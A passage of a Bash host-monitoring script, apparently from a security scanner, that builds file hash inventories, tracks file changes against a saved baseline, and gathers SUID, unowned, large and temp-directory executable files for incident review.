    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$action" "$path" "${old_path:-}" "$md5" "$sha" "$size" "$priority" "$priority_score" "$priority_reasons" >> "${RAW_DIR}/file-changes.tsv"
    assess_file_change "$action" "$path" "$md5" "$sha" "$size" "$old_path" "$priority_score" "$priority_reasons"
}

monitor_native_file_record() {
    local priority_score="$1" priority_reasons="$2" path="$3" dev="$4" inode="$5" size="$6" mtime="$7" ctime="$8" status="$9" md5="${10}" sha="${11}" message="${12:-}"
    local old="" old_dev="" old_inode="" old_size="" old_mtime="" old_md5="" old_sha="" old_ctime="" action="" old_path="" priority="NORMAL"
    [ -n "$path" ] || return 0
    FILE_SCAN_SCANNED=$((FILE_SCAN_SCANNED + 1))
    [[ ",${priority_reasons}," != *,ADDED_SMALL,* ]] || FILE_SCAN_SMALL_PRIORITY=$((FILE_SCAN_SMALL_PRIORITY + 1))
    [ "$status" = SUCCESS ] || [ "$status" = REUSED ] || {
        FILE_SCAN_SKIPPED=$((FILE_SCAN_SKIPPED + 1))
        FILE_SCAN_HASH_FAILED=$((FILE_SCAN_HASH_FAILED + 1))
        printf '%s\t%s\t%s\n' "$path" "$status" "${message:-native_hash_failed}" >> "${RAW_DIR}/file-hash-errors.tsv"
        return 0
    }
    [ "$status" = REUSED ] && FILE_SCAN_HASH_REUSED=$((FILE_SCAN_HASH_REUSED + 1)) || FILE_SCAN_HASH_SUCCESS=$((FILE_SCAN_HASH_SUCCESS + 1))
    current_path["$path"]=1
    current_inode["${dev}:${inode}"]="$path"
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$dev" "$inode" "$size" "$mtime" "$md5" "$sha" "$ctime" >> "$FILE_INVENTORY_PENDING"
    if [ -n "${previous_line[$path]:-}" ]; then
        old="${previous_line[$path]}"
        IFS=$'\t' read -r old_dev old_inode old_size old_mtime old_md5 old_sha old_ctime <<< "$old"
        [ "$old_sha" = "$sha" ] || action="MODIFIED"
    elif [ -n "${previous_inode_path[${dev}:${inode}]:-}" ]; then
        action="MOVED"; old_path="${previous_inode_path[${dev}:${inode}]}"
    else
        action="ADDED"
    fi
    [ -n "$action" ] || return 0
    [ "$action" != ADDED ] || { [ "$size" -ge "$FILE_SMALL_PRIORITY_BYTES" ] || priority="SMALL_ADDED"; }
    FILE_SCAN_CHANGES=$((FILE_SCAN_CHANGES + 1))
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$action" "$path" "${old_path:-}" "$md5" "$sha" "$size" "$priority" "$priority_score" "$priority_reasons" >> "${RAW_DIR}/file-changes.tsv"
    assess_file_change "$action" "$path" "$md5" "$sha" "$size" "$old_path" "$priority_score" "$priority_reasons"
}

import_native_suspicious_files_tsv() {
    local input="$1" priority priority_score priority_reasons size action path sev confidence md5 sha reason context
    [ -r "$input" ] || return 1
    while IFS=$'\t' read -r priority priority_score priority_reasons size action path sev confidence md5 sha reason context; do
        [ "$priority" != priority ] || continue
        [ -n "$path" ] || continue
        FILE_BEHAVIOR_PRIORITIES+=("$priority")
        FILE_BEHAVIOR_PRIORITY_SCORES+=("$priority_score")
        FILE_BEHAVIOR_PRIORITY_REASONS+=("$priority_reasons")
        FILE_BEHAVIOR_SIZES+=("$size")
        FILE_BEHAVIOR_ACTIONS+=("$action")
        FILE_BEHAVIOR_PATHS+=("$path")
        FILE_BEHAVIOR_SEVS+=("$sev")
        FILE_BEHAVIOR_CONFIDENCES+=("$confidence")
        FILE_BEHAVIOR_MD5+=("$md5")
        FILE_BEHAVIOR_SHA256+=("$sha")
        FILE_BEHAVIOR_REASONS+=("$reason")
        FILE_BEHAVIOR_CONTEXTS+=("$context")
    done < "$input"
}

import_native_file_findings_jsonl() {
    local input="$1" row sev category summary evidence recommendation mitre rule entity raw_refs finding_type confidence judgment escalation domains counter timeline
    [ -s "$input" ] || return 0
    while IFS=$'\t' read -r row; do
        IFS=$'\037' read -r sev category summary evidence recommendation mitre rule entity raw_refs finding_type confidence judgment escalation domains counter timeline <<< "$row"
        [ -n "$summary" ] || continue
        record_find "$sev" "$category" "$summary" "$evidence" "$recommendation" "$mitre" "$rule" "$entity" "$raw_refs" "$finding_type" "$confidence" "$judgment" "$escalation" "$domains" "$counter" "$timeline"
    done < <(python3 - "$input" <<'PY'
import json, sys
fields = ["severity","category","summary","evidence","recommendation","mitre","rule_id","entity","raw_refs","finding_type","confidence","judgment_basis","escalation_conditions","evidence_domains","counter_evidence","timeline"]
with open(sys.argv[1], encoding="utf-8", errors="replace") as stream:
    for line in stream:
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        values = []
        for key in fields:
            value = str(obj.get(key, ""))
            values.append(value.replace("\t", " ").replace("\r", " ").replace("\n", " ").replace("\x1f", " "))
        print("\x1f".join(values))
PY
)
}

import_native_file_monitor_summary() {
    local summary="$1" parsed native_status native_baseline_mode
    [ -s "$summary" ] || return 1
    parsed=$(python3 - "$summary" <<'PY'
import json, sys
try:
    data = json.load(open(sys.argv[1], encoding="utf-8", errors="replace"))
except Exception:
    sys.exit(1)
keys = ["status","scanned","skipped","hash_success","hash_reused","hash_failed","changes","suspicious","observe","added_small","small_priority","baseline_mode"]
print("\t".join(str(data.get(key, "")) for key in keys))
PY
) || return 1
    IFS=$'\t' read -r native_status FILE_SCAN_SCANNED FILE_SCAN_SKIPPED FILE_SCAN_HASH_SUCCESS FILE_SCAN_HASH_REUSED FILE_SCAN_HASH_FAILED FILE_SCAN_CHANGES FILE_SCAN_SUSPICIOUS FILE_SCAN_OBSERVE FILE_SCAN_ADDED_SMALL FILE_SCAN_SMALL_PRIORITY native_baseline_mode <<< "$parsed"
    case "$native_status" in SUCCESS) FILE_SCAN_STATUS=SUCCESS ;; PARTIAL) FILE_SCAN_STATUS=PARTIAL_TIMEOUT ;; *) return 1 ;; esac
    [ "$native_baseline_mode" != True ] && [ "$native_baseline_mode" != true ] || { FILE_SCAN_BASELINE=true; FILE_SCAN_MODE=BASELINE; }
}

run_native_file_monitor() {
    local sorted_priority_file="$1" inventory_header="$2" summary="${RAW_DIR}/file-monitor-summary.json" findings="${RAW_DIR}/file-findings.jsonl" rc=0
    local -a native_command=("$NATIVE_SCANNER_PATH" file-monitor --input-list "$sorted_priority_file" \
        --inventory-output "$FILE_INVENTORY_PENDING" --changes-output "${RAW_DIR}/file-changes.tsv" \
        --errors-output "${RAW_DIR}/file-hash-errors.tsv" --suspicious-output "${RAW_DIR}/suspicious-files.tsv" \
        --findings-output "$findings" --summary-output "$summary" --inventory-header "$inventory_header" \
        --baseline "$FILE_INVENTORY_FILE" --cache-key "$FILE_SCAN_CACHE_KEY" --cache-analyzer-version "$NATIVE_HASH_ANALYZER_VERSION" \
        --cache-profile "$SCAN_PROFILE" --cache-max-bytes "$FILE_MAX_HASH_BYTES" --cache-rules "$FILE_SCAN_RULE_FINGERPRINT" \
        --max-files "$FILE_MAX_FILES" --max-bytes "$FILE_MAX_HASH_BYTES" --timeout-seconds "$FILE_TIMEOUT_SECONDS" \
        --small-priority-bytes "$FILE_SMALL_PRIORITY_BYTES" --priority-persistence-path "$FILE_PRIORITY_PERSISTENCE_PATH" \
        --approved-hashes "$FILE_APPROVED_HASHES" --malicious-hashes "$FILE_MALICIOUS_HASHES" --maintenance-active "$MAINTENANCE_ACTIVE" \
        --process-context "${RAW_DIR}/process-context.tsv" --socket-tsv "${RAW_DIR}/socket-snapshot.tsv")
    run_with_timeout "$((FILE_TIMEOUT_SECONDS + 15))" "${native_command[@]}" >/dev/null 2> "${RAW_DIR}/file-monitor.error" || rc=$?
    [ "$rc" -eq 0 ] || return 1
    grep -Eq '\"status\"[[:space:]]*:[[:space:]]*\"(SUCCESS|PARTIAL)\"' "$summary" || return 1
    [ -s "$FILE_INVENTORY_PENDING" ] && [ -f "${RAW_DIR}/file-changes.tsv" ] && [ -f "${RAW_DIR}/file-hash-errors.tsv" ] && [ -s "${RAW_DIR}/suspicious-files.tsv" ] && [ -f "$findings" ] || return 1
    import_native_file_monitor_summary "$summary" || return 1
    import_native_suspicious_files_tsv "${RAW_DIR}/suspicious-files.tsv" || return 1
    import_native_file_findings_jsonl "$findings" || return 1
    record_raw_status 'file-monitor-summary.json' "$FILE_SCAN_STATUS" filesystem "native_file_monitor=${FILE_SCAN_STATUS}"
    record_raw_status 'file-findings.jsonl' "$([ -s "$findings" ] && printf SUCCESS || printf NO_RESULTS)" filesystem 'native_file_monitor'
    [ ! -s "${RAW_DIR}/file-monitor.error" ] || record_raw_status 'file-monitor.error' PARTIAL filesystem 'native_file_monitor_stderr'
    return 0
}

run_native_hash_batch() {
    local priority_file="$1" sorted_priority_file="$2" native_output="${OUTPUT_DIR}/.native-file-hashes.${RUN_ID}" summary="${OUTPUT_DIR}/.native-file-hashes-summary.${RUN_ID}" rc=0 parsed=0
    local priority_score priority_mtime priority_size path priority_reasons dev inode size mtime ctime status md5 sha message
    local -a native_command=("$NATIVE_SCANNER_PATH" hash-files --input-list "$sorted_priority_file" --output "$native_output" --max-files "$FILE_MAX_FILES" --max-bytes "$FILE_MAX_HASH_BYTES" --timeout-seconds "$FILE_TIMEOUT_SECONDS")
    [ "$FILE_SCAN_BASELINE" = true ] && native_command+=(--baseline "$FILE_INVENTORY_FILE" --cache-key "$FILE_SCAN_CACHE_KEY" \
        --cache-analyzer-version "$NATIVE_HASH_ANALYZER_VERSION" --cache-profile "$SCAN_PROFILE" \
        --cache-max-bytes "$FILE_MAX_HASH_BYTES" --cache-rules "$FILE_SCAN_RULE_FINGERPRINT")
    run_with_timeout "$((FILE_TIMEOUT_SECONDS + 5))" "${native_command[@]}" > "$summary" 2>&1 || rc=$?
    [ "$rc" -eq 0 ] || { rm -f "$native_output" "$summary"; return 1; }
    [ -s "$native_output" ] || { rm -f "$native_output" "$summary"; return 1; }
    while IFS=$'\t' read -r priority_score priority_mtime priority_size path priority_reasons dev inode size mtime ctime status md5 sha message; do
        [ "$path" = path ] && continue
        [ -n "$path" ] || continue
        monitor_native_file_record "$priority_score" "$priority_reasons" "$path" "$dev" "$inode" "$size" "$mtime" "$ctime" "$status" "$md5" "$sha" "$message"
        parsed=$((parsed + 1))
    done < <(tail -n +2 "$native_output")
    [ "$parsed" -gt 0 ] || [ ! -s "$sorted_priority_file" ] || { rm -f "$native_output" "$summary"; return 1; }
    if grep -Eq '"timed_out"[[:space:]]*:[[:space:]]*true' "$summary"; then
        FILE_SCAN_STATUS="PARTIAL_TIMEOUT"
    elif grep -Eq '"max_files_reached"[[:space:]]*:[[:space:]]*true' "$summary"; then
        FILE_SCAN_STATUS="PARTIAL_LIMIT"
    fi
    chmod 600 "$native_output" "$summary" 2>/dev/null || true
    rm -f "$native_output" "$summary"
    return 0
}

run_incremental_file_monitoring() {
    FILE_BEHAVIOR_PATHS=(); FILE_BEHAVIOR_ACTIONS=(); FILE_BEHAVIOR_SEVS=(); FILE_BEHAVIOR_CONFIDENCES=()
    FILE_BEHAVIOR_MD5=(); FILE_BEHAVIOR_SHA256=(); FILE_BEHAVIOR_REASONS=(); FILE_BEHAVIOR_CONTEXTS=()
    FILE_BEHAVIOR_SIZES=(); FILE_BEHAVIOR_PRIORITIES=(); FILE_BEHAVIOR_PRIORITY_SCORES=(); FILE_BEHAVIOR_PRIORITY_REASONS=()
    FILE_SCAN_STATUS="NOT_RUN"; FILE_SCAN_MODE="SNAPSHOT"; FILE_SCAN_BASELINE=false
    FILE_SCAN_SCANNED=0; FILE_SCAN_SKIPPED=0; FILE_SCAN_HASH_SUCCESS=0; FILE_SCAN_HASH_REUSED=0; FILE_SCAN_HASH_FAILED=0
    FILE_SCAN_CHANGES=0; FILE_SCAN_SMALL_PRIORITY=0; FILE_SCAN_ADDED_SMALL=0; FILE_SCAN_SUSPICIOUS=0; FILE_SCAN_OBSERVE=0
    load_file_scan_config
    prepare_file_scan_matchers
    prepare_file_scan_cache_key
    [ "$STATE_ENABLED" = true ] || { FILE_SCAN_STATUS="DISABLED_NO_STATE"; return 0; }
    FILE_INVENTORY_FILE="${STATE_DIR}/file_inventory.${SCAN_PROFILE}.state"
    if [ "$SCAN_PROFILE" = daily-hunt ] && [ ! -s "$FILE_INVENTORY_FILE" ] && [ -s "${STATE_DIR}/file_inventory.state" ]; then
        cp "${STATE_DIR}/file_inventory.state" "$FILE_INVENTORY_FILE" 2>/dev/null || true
        [ ! -s "${STATE_DIR}/file_inventory.state.bak" ] || cp "${STATE_DIR}/file_inventory.state.bak" "${FILE_INVENTORY_FILE}.bak" 2>/dev/null || true
    fi
    FILE_INVENTORY_PENDING="${OUTPUT_DIR}/.file_inventory.pending"
    local started root path phase rc stop_scan=false count=0 priority_score priority_mtime priority_size priority_reasons pid_dir mapped_path candidate_now_epoch
    local dev inode size mtime md5 sha ctime
    local -a roots=()
    declare -A previous_line=() previous_inode_path=() current_path=() current_inode=()
    declare -A runtime_exe_candidates=() runtime_mapped_candidates=() candidate_seen=()
    if [ -s "$FILE_INVENTORY_FILE" ] && file_inventory_header_is_compatible "$FILE_INVENTORY_FILE"; then
        FILE_SCAN_BASELINE=true
        while IFS=$'\t' read -r path dev inode size mtime md5 sha ctime; do
            [[ -z "$path" || "$path" == \#* ]] && continue
            [[ "$md5" =~ ^[[:xdigit:]]{32}$ && "$sha" =~ ^[[:xdigit:]]{64}$ ]] || continue
            previous_line["$path"]="$dev"$'\t'"$inode"$'\t'"$size"$'\t'"$mtime"$'\t'"$md5"$'\t'"$sha"$'\t'"$ctime"
            previous_inode_path["${dev}:${inode}"]="$path"
        done < "$FILE_INVENTORY_FILE"
    fi
    local inventory_header native_file_monitor_done=false
    inventory_header=$(printf '#secscope-file-inventory-v%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s' \
        "$FILE_SCAN_CACHE_SCHEMA_VERSION" "$HOST_ID" "$RUN_STARTED_AT" "$NATIVE_HASH_ANALYZER_VERSION" \
        "$SCAN_PROFILE" "$FILE_MAX_HASH_BYTES" "$FILE_SCAN_RULE_FINGERPRINT" "$FILE_SCAN_CACHE_KEY")
    printf '%s\n' "$inventory_header" > "$FILE_INVENTORY_PENDING"
    started=$SECONDS; candidate_now_epoch=$(date +%s); IFS=',' read -r -a roots <<< "$FILE_SCAN_ROOTS"

    # 对全部有界候选先评分，再以分数、mtime、大小和路径形成稳定顺序。
    local priority_file="${OUTPUT_DIR}/.file-priority.${RUN_ID}" sorted_priority_file="${OUTPUT_DIR}/.file-priority-sorted.${RUN_ID}"
    : > "$priority_file"
    benchmark_stage_begin file_candidate_discovery
    for pid_dir in /proc/[0-9]*; do
        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_PID_VISITS=$((BENCHMARK_PROC_PID_VISITS + 1))
        path=$(readlink "$pid_dir/exe" 2>/dev/null); path="${path% (deleted)}"
        [ -n "$path" ] && runtime_exe_candidates["$path"]=1
        [ -r "$pid_dir/maps" ] || continue
        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_MAPS_VISITS=$((BENCHMARK_PROC_MAPS_VISITS + 1))
        while IFS= read -r mapped_path; do [ -n "$mapped_path" ] && runtime_mapped_candidates["$mapped_path"]=1; done < <(awk 'NF>=6 && $2 ~ /x/ && substr($NF,1,1)=="/" && $NF !~ /[(]deleted[)]$/ {print $NF}' "$pid_dir/maps" 2>/dev/null)
    done
    for path in "${!runtime_exe_candidates[@]}" "${!runtime_mapped_candidates[@]}"; do
        rc=0; add_scored_file_candidate "$path" || rc=$?; [ "$rc" -ne 2 ] || { stop_scan=true; break; }
    done
    if [ "$stop_scan" = false ]; then
        for root in "${roots[@]}"; do
            [ -d "$root" ] || continue
            while IFS= read -r -d '' path; do
                [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_FILE_TRAVERSED=$((BENCHMARK_FILE_TRAVERSED + 1))
                rc=0; add_scored_file_candidate "$path" || rc=$?
                [ "$rc" -ne 2 ] || { stop_scan=true; break; }
            done < <(run_with_timeout "$FILE_TIMEOUT_SECONDS" find "$root" -xdev -maxdepth "$FILE_MAX_DEPTH" -type f -print0 2>/dev/null)
            [ "$stop_scan" = false ] || break
        done
    fi
    benchmark_stage_end file_candidate_discovery
    benchmark_stage_begin file_candidate_sort
    LC_ALL=C sort -t $'\t' -k1,1nr -k2,2nr -k3,3n -k4,4 "$priority_file" > "$sorted_priority_file"
    benchmark_stage_end file_candidate_sort
    benchmark_stage_begin file_hash_and_delta
    if [ "$NATIVE_FILE_MONITOR_READY" = true ] && run_native_file_monitor "$sorted_priority_file" "$inventory_header"; then
        native_file_monitor_done=true
    else
        [ "$NATIVE_FILE_MONITOR_READY" = true ] && BENCHMARK_FALLBACK_COUNT=$((BENCHMARK_FALLBACK_COUNT + 1))
        benchmark_stage_begin file_context_indexes
        build_file_context_indexes "$sorted_priority_file"
        benchmark_stage_end file_context_indexes
        if [ "$NATIVE_HASH_FILES_READY" = true ]; then
            if run_native_hash_batch "$priority_file" "$sorted_priority_file"; then
                :
            else
                BENCHMARK_FALLBACK_COUNT=$((BENCHMARK_FALLBACK_COUNT + 1))
                while IFS=$'\t' read -r priority_score priority_mtime priority_size path priority_reasons; do
                    rc=0; monitor_file_candidate "$path" SCORED "$priority_score" "$priority_reasons" || rc=$?
                    [ "$rc" -ne 2 ] || { stop_scan=true; break; }
                done < "$sorted_priority_file"
            fi
        else
            while IFS=$'\t' read -r priority_score priority_mtime priority_size path priority_reasons; do
                rc=0; monitor_file_candidate "$path" SCORED "$priority_score" "$priority_reasons" || rc=$?
                [ "$rc" -ne 2 ] || { stop_scan=true; break; }
            done < "$sorted_priority_file"
        fi
    fi
    benchmark_stage_end file_hash_and_delta
    rm -f "$priority_file" "$sorted_priority_file"
    if [ "$native_file_monitor_done" = false ] && [ -s "$FILE_INVENTORY_FILE" ] && [ "$FILE_SCAN_STATUS" = "NOT_RUN" ]; then
        while IFS=$'\t' read -r path dev inode size mtime md5 sha ctime; do
            [[ -z "$path" || "$path" == \#* ]] && continue
            [ -z "${current_path[$path]:-}" ] || continue
            [ -z "${current_inode[${dev}:${inode}]:-}" ] || continue
            FILE_SCAN_CHANGES=$((FILE_SCAN_CHANGES + 1))
            priority_score=0; priority_reasons=DELETED_BASELINE
            critical_persistence_path "$path" && { priority_score="$FILE_PRIORITY_PERSISTENCE_PATH"; priority_reasons=PERSISTENCE_PATH; }
            printf 'DELETED\t%s\t\t%s\t%s\t%s\tNORMAL\t%s\t%s\n' "$path" "$md5" "$sha" "$size" "$priority_score" "$priority_reasons" >> "${RAW_DIR}/file-changes.tsv"
            assess_file_change DELETED "$path" "$md5" "$sha" "$size" '' "$priority_score" "$priority_reasons"
        done < "$FILE_INVENTORY_FILE"
        FILE_SCAN_BASELINE=false
    elif [ ! -s "$FILE_INVENTORY_FILE" ]; then
        FILE_SCAN_BASELINE=true; FILE_SCAN_MODE="BASELINE"
    fi
    cp "$FILE_INVENTORY_PENDING" "${RAW_DIR}/file-inventory-current.tsv"
    {
        printf 'priority\tpriority_score\tpriority_reasons\tsize_bytes\taction\tpath\tseverity\tconfidence\tmd5\tsha256\treason\tcontext\n'
        local idx
        for idx in "${!FILE_BEHAVIOR_PATHS[@]}"; do
            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "${FILE_BEHAVIOR_PRIORITIES[$idx]}" "${FILE_BEHAVIOR_PRIORITY_SCORES[$idx]}" "${FILE_BEHAVIOR_PRIORITY_REASONS[$idx]}" "${FILE_BEHAVIOR_SIZES[$idx]}" "${FILE_BEHAVIOR_ACTIONS[$idx]}" "${FILE_BEHAVIOR_PATHS[$idx]}" "${FILE_BEHAVIOR_SEVS[$idx]}" "${FILE_BEHAVIOR_CONFIDENCES[$idx]}" "${FILE_BEHAVIOR_MD5[$idx]}" "${FILE_BEHAVIOR_SHA256[$idx]}" "${FILE_BEHAVIOR_REASONS[$idx]}" "${FILE_BEHAVIOR_CONTEXTS[$idx]}"
        done
    } > "${RAW_DIR}/suspicious-files.tsv"
    record_raw_status 'file-inventory-current.tsv' SUCCESS filesystem ''
    [ -s "${RAW_DIR}/file-changes.tsv" ] && record_raw_status 'file-changes.tsv' SUCCESS filesystem '' || { : > "${RAW_DIR}/file-changes.tsv"; record_raw_status 'file-changes.tsv' NO_RESULTS filesystem ''; }
    [ -s "${RAW_DIR}/file-hash-errors.tsv" ] && record_raw_status 'file-hash-errors.tsv' SUCCESS filesystem '' || { : > "${RAW_DIR}/file-hash-errors.tsv"; record_raw_status 'file-hash-errors.tsv' NO_RESULTS filesystem ''; }
    record_raw_status 'suspicious-files.tsv' SUCCESS filesystem ''
    if [ "$FILE_SCAN_STATUS" = "NOT_RUN" ] && [ "$FILE_SCAN_HASH_FAILED" -gt 0 ]; then FILE_SCAN_STATUS="PARTIAL_HASH_ERRORS"; fi
    [ "$FILE_SCAN_STATUS" = "NOT_RUN" ] && FILE_SCAN_STATUS="SUCCESS"
    [ "$FILE_SCAN_STATUS" = "SUCCESS" ] && FILE_INVENTORY_READY=true || FILE_INVENTORY_READY=false
}

initialize_corpus_file_monitoring_artifacts() {
    FILE_SCAN_MODE="CORPUS_MANIFEST"
    FILE_SCAN_STATUS="NOT_APPLICABLE"
    FILE_SCAN_BASELINE=false
    FILE_SCAN_SCANNED=0; FILE_SCAN_SKIPPED=0; FILE_SCAN_HASH_SUCCESS=0; FILE_SCAN_HASH_REUSED=0; FILE_SCAN_HASH_FAILED=0
    FILE_SCAN_CHANGES=0; FILE_SCAN_SMALL_PRIORITY=0; FILE_SCAN_ADDED_SMALL=0; FILE_SCAN_SUSPICIOUS=0; FILE_SCAN_OBSERVE=0
    printf 'action\tpath\told_path\tmd5\tsha256\tsize\tpriority\tpriority_score\tpriority_reasons\n' > "${RAW_DIR}/file-changes.tsv"
    printf 'priority\tpriority_score\tpriority_reasons\tsize_bytes\taction\tpath\tseverity\tconfidence\tmd5\tsha256\treason\tcontext\n' > "${RAW_DIR}/suspicious-files.tsv"
    : > "${RAW_DIR}/file-hash-errors.tsv"
    printf '# corpus-validation uses static-candidates.txt as its authoritative inventory\n' > "${RAW_DIR}/file-inventory-current.tsv"
    record_raw_status 'file-inventory-current.tsv' NOT_APPLICABLE filesystem 'corpus_manifest_is_authoritative'
    record_raw_status 'file-changes.tsv' NOT_APPLICABLE filesystem 'cross_round_baseline_disabled_for_corpus'
    record_raw_status 'file-hash-errors.tsv' NO_RESULTS filesystem ''
    record_raw_status 'suspicious-files.tsv' NOT_APPLICABLE filesystem 'corpus_manifest_is_authoritative'
}

check_lightweight_temp_executables() {
    local tmp_exe candidate_path candidate_type candidate_meta candidate_running sev confidence
    tmp_exe=$(collect_temp_code_candidates)
    [ -n "$tmp_exe" ] || { : > "${RAW_DIR}/tmp_executables.txt"; record_raw_status 'tmp_executables.txt' NO_RESULTS filesystem ''; return 0; }
    printf '%s\n' "$tmp_exe" > "${RAW_DIR}/tmp_executables.txt"
    record_raw_status 'tmp_executables.txt' SUCCESS filesystem ''
    while IFS=$'\t' read -r candidate_path candidate_type candidate_meta candidate_running; do
        [ -n "$candidate_path" ] || continue
        sev=OBSERVE; confidence=LOW
        [ "$candidate_running" = no ] || { sev=HIGH; confidence=MEDIUM; }
        record_find "$sev" filesystem "临时目录代码型可执行文件: $candidate_path" \
            "type=${candidate_type}; ${candidate_meta}; running=${candidate_running}" \
            '核对来源、哈希、创建时间、稳定进程实体和网络连接' 'T1204' 'FS-TEMP-EXECUTABLE' "$candidate_path" \
            'tmp_executables.txt,process-context.tsv,abnormal-connections.tsv' 'SECURITY_ANOMALY' "$confidence" \
            '临时目录代码文件具有较高调查价值；仅在运行或关联网络时提升优先级' \
            '若关联新增外连、Web 祖先进程、持久化或恶意哈希，应升级' 'FILE,PROCESS'
    done <<< "$tmp_exe"
}

save_file_inventory_state() {
    [ "$FILE_INVENTORY_READY" = true ] || return 0
    [ -s "$FILE_INVENTORY_PENDING" ] || return 1
    local tmp="${STATE_DIR}/.file_inventory.${SCAN_PROFILE}.next.$$"
    cp "$FILE_INVENTORY_PENDING" "$tmp" || return 1
    chmod 600 "$tmp" || return 1
    [ ! -s "$FILE_INVENTORY_FILE" ] || cp "$FILE_INVENTORY_FILE" "${FILE_INVENTORY_FILE}.bak"
    mv "$tmp" "$FILE_INVENTORY_FILE"
    chmod 600 "$FILE_INVENTORY_FILE" "${FILE_INVENTORY_FILE}.bak" 2>/dev/null || true
    rm -f -- "$FILE_INVENTORY_PENDING"
}

collect_filesystem_global_facts() {
    local root="${1:-/}" suid_all="${RAW_DIR}/.suid-sgid.all" weird_suid_all="${RAW_DIR}/.weird-suid.all" unowned_all="${RAW_DIR}/.unowned.all" large_all="${RAW_DIR}/.large-files.all" recent_all="${RAW_DIR}/.recent-files.all" persistence_all="${RAW_DIR}/.persistence-files.all" coverage="${RAW_DIR}/filesystem-facts.jsonl" summary="${RAW_DIR}/filesystem-facts-summary.json" rc=0 native_status=SUCCESS
    FILESYSTEM_SUID_ALL="$suid_all"; FILESYSTEM_WEIRD_SUID_ALL="$weird_suid_all"; FILESYSTEM_UNOWNED_ALL="$unowned_all"; FILESYSTEM_LARGE_ALL="$large_all"; FILESYSTEM_RECENT_ALL="$recent_all"; FILESYSTEM_PERSISTENCE_ALL="$persistence_all"
    : > "$suid_all"; : > "$weird_suid_all"; : > "$unowned_all"; : > "$large_all"
    : > "$recent_all"; : > "$persistence_all"; : > "$coverage"; : > "$summary"
    if [ -x "$NATIVE_SCANNER_PATH" ]; then
        run_with_timeout "$FILE_TIMEOUT_SECONDS" "$NATIVE_SCANNER_PATH" filesystem-facts --root "$root" \
            --suid-output "$suid_all" --weird-suid-output "$weird_suid_all" --unowned-output "$unowned_all" \
            --large-output "$large_all" --recent-output "$recent_all" --persistence-output "$persistence_all" \
            --coverage-jsonl "$coverage" --max-files 50000000 --max-depth 64 --recent-seconds $((7 * 86400)) \
            --timeout-seconds "$FILE_TIMEOUT_SECONDS" > "$summary" 2>&1 || rc=$?
        grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$summary" && native_status=PARTIAL || true
        if [ "$rc" -eq 0 ] && grep -Eq '"status"[[:space:]]*:[[:space:]]*"(SUCCESS|PARTIAL)"' "$summary" && \
            [ -s "$coverage" ] && [ -f "$suid_all" ] && [ -f "$weird_suid_all" ] && [ -f "$unowned_all" ] && [ -f "$large_all" ] && [ -f "$recent_all" ] && [ -f "$persistence_all" ]; then
            head -50 "$suid_all" > "${RAW_DIR}/suid_sgid_files.txt"
            head -50 "$unowned_all" > "${RAW_DIR}/unowned_files.txt"
            head -50 "$large_all" > "${RAW_DIR}/large_files.txt"
            head -200 "$persistence_all" > "${RAW_DIR}/persistence-paths.txt"
            chmod 600 "$suid_all" "$weird_suid_all" "$unowned_all" "$large_all" "$recent_all" "$persistence_all" "$coverage" "$summary" "${RAW_DIR}/persistence-paths.txt" 2>/dev/null || true
            record_raw_status 'filesystem-facts.jsonl' "$native_status" filesystem "native_filesystem_facts=${native_status}"
            record_raw_status 'filesystem-facts-summary.json' "$native_status" filesystem "native_filesystem_facts=${native_status}"
            record_raw_status 'suid_sgid_files.txt' "$([ -s "${RAW_DIR}/suid_sgid_files.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
            record_raw_status 'unowned_files.txt' "$([ -s "${RAW_DIR}/unowned_files.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
            record_raw_status 'large_files.txt' "$([ -s "${RAW_DIR}/large_files.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
            record_raw_status 'persistence-paths.txt' "$([ -s "${RAW_DIR}/persistence-paths.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
            [ "$native_status" = PARTIAL ] || return 0
            mark_current_module_partial native_filesystem_facts_partial
            return 0
        fi
        mark_current_module_partial "native_filesystem_facts_exit_${rc}"
        : > "$suid_all"; : > "$weird_suid_all"; : > "$unowned_all"; : > "$large_all"; : > "$recent_all"; : > "$persistence_all"
    fi
    # Independent comma-separated actions feed all checks from one filesystem walk.
    if [ "$root" = / ]; then
        run_with_timeout "$FILE_TIMEOUT_SECONDS" find / -xdev \( -path /proc -o -path /sys -o -path /snap \) -prune -o -type f \
            \( \( -perm -4000 -o -perm -2000 \) -fprint "$suid_all" , \
               \( -perm -4000 \( -path '/tmp/*' -o -path '/dev/shm/*' -o -path '/var/tmp/*' -o -path '/home/*' \) \) -fprint "$weird_suid_all" , \
               \( -nouser -o -nogroup \) -fprint "$unowned_all" , \
               -size +200M -fprint "$large_all" \) 2>/dev/null || rc=$?
    else
        run_with_timeout "$FILE_TIMEOUT_SECONDS" find "$root" -xdev -type f \
            \( \( -perm -4000 -o -perm -2000 \) -fprint "$suid_all" , \
               \( -nouser -o -nogroup \) -fprint "$unowned_all" , \
               -size +200M -fprint "$large_all" \) 2>/dev/null || rc=$?
    fi
    head -50 "$suid_all" > "${RAW_DIR}/suid_sgid_files.txt"
    head -50 "$unowned_all" > "${RAW_DIR}/unowned_files.txt"
    head -50 "$large_all" > "${RAW_DIR}/large_files.txt"
    : > "$recent_all"; : > "$persistence_all"
    record_raw_status 'suid_sgid_files.txt' "$([ -s "${RAW_DIR}/suid_sgid_files.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
    record_raw_status 'unowned_files.txt' "$([ -s "${RAW_DIR}/unowned_files.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
    record_raw_status 'large_files.txt' "$([ -s "${RAW_DIR}/large_files.txt" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
